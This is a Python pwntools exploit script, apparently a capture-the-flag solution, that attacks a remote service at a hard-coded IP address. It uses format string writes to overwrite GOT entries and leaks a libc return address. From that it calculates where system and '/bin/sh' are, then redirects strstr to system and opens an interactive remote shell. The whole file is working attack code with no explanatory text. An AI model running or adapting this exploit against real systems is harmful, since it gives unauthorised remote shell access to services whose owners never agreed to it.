from pwn import *
#context.log_level = 'debug'
#p = process('what')
p = remote("106.75.93.227",10000)

p.recvuntil('name: ')
p.sendline('A'*8)
p.recvuntil('msg: ')
#gdb.attach(p,'b *0x400968')
main = 0x0400983
fail_got = 0x0601020
msg = (
        '%%%dc'%(main & 0xffff),
        '%8$hn',
        )
#msg = "AABB%8$016lx"
msg = ''.join(msg).ljust(16,'B') + p64(fail_got)
raw_input('='*20+"overwrite fail_got"+'='*20)
p.sendline(msg)
log.success('overwrite successfully!')


p.recvuntil('name: ')
p.sendline('C'*8)
p.recvuntil('msg: ')
#gdb.attach(p,'b *0x400968')
msg = '%29$016lx'.ljust(24,'0')
raw_input('='*20+"leak libc_start_main_ret"+'='*20)
p.sendline(msg)
__libc_start_main_ret = int(p.recv(16),16)
log.success('__libc_start_main_ret = ' + hex(__libc_start_main_ret))

#from libc-database
offset___libc_start_main_ret = 0x21f45
offset_system = 0x0000000000046590
offset_dup2 = 0x00000000000ebe90
offset_read = 0x00000000000eb6a0
offset_write = 0x00000000000eb700
offset_str_bin_sh = 0x17c8c3
offset___libc_start_main_ret = 0x21b15
offset_system = 0x00000000000423f0
offset_dup2 = 0x00000000000e8b70
offset_read = 0x00000000000e8490
offset_write = 0x00000000000e84f0
offset_str_bin_sh = 0x17bde9



system = __libc_start_main_ret - offset___libc_start_main_ret + offset_system
log.success('system = ' + hex(system))
binsh = __libc_start_main_ret - offset___libc_start_main_ret + offset_str_bin_sh
log.success('binsh = ' + hex(binsh))


strstr_got = 0x0601068
p.recvuntil('name: ')
p.sendline("A"*8)
p.recvuntil('msg: ')
#gdb.attach(p,'b *0x400968')
p.sendline(p64(strstr_got)+"D"*16)
p.recvuntil('name: ')
p.sendline(p64(strstr_got+2))
p.recvuntil('msg: ')
#gdb.attach(p,'b *0x400968')

msg = (
        '%%%dc'%(system&0xffff),
        '%18$hn',
        '%%%dc'%(((system>>16)&0xffff)-(system&0xffff)),
        '%12$hn',
        )
msg = ''.join(msg)
#msg = "%18$lx.%12$lx"
raw_input('='*20+"overwrite strstr_got"+'='*20)
p.sendline(msg)

log.success('waiting for printing space')
sleep(3)

p.sendline('urdaddy')
p.recv()
p.sendline('//bin/sh\0')

p.interactive()
